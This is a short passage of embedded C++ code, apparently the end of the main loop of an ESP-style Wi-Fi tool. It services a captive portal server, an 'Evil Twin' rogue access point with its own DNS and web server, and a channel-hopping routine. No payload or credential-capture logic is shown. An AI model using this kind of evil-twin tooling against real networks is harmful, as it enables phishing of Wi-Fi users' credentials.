        if (portalWebServer) portalWebServer->handleClient();
    }

    // Evil Twin tick
    if (twinActive) {
        if (twinDNS) twinDNS->processNextRequest();
        if (twinWebServer) twinWebServer->handleClient();
    }

    // Channel Hopping tick
    if (hopActive) hopTick();































































































    delay(5);
}
